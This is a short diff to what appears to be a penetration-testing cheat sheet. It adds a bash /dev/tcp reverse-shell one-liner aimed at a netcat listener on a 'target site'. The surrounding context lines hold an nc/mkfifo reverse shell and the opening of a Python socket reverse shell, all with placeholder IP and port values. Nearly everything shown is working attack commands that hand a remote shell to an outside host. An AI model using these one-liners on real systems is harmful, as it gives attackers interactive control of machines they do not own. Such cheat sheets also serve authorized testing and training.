@@ -535,6 +535,10 @@ or
 -  alternative way to get a reverse shell in case -e option is not available
 `> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`
 
+#### bash reverse shell to netcat listener (target site)
+
+`> bash -i >& /dev/tcp/IP/PORT 0>&1`
+
 #### reverse shell [py]
 	python -c 'import socket,subprocess,os;
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
